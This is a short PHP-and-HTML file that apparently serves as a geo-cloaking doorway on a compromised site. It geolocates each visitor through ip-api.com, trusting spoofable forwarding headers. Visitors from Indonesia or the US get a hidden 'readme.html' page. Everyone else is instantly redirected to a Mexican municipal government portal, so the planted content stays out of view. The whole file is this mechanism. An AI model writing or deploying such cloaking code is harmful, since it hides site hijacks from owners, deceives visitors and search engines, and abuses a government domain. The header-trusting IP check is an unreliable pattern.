<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

$ip = getUserIP();
$api_url = "http://ip-api.com/json/{$ip}";
$response = file_get_contents($api_url);
$data = json_decode($response, true);

if ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US') {
    ob_start();
    include 'readme.html';
    $output = ob_get_clean();
    echo $output;
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <!-- Add the refresh meta tag with the destination URL and time to wait before redirecting (0 seconds in this case) -->
    <meta http-equiv="refresh" content="0; url=https://www.cardenas.gob.mx/portal">
</head>
<body>
</body>
</html>
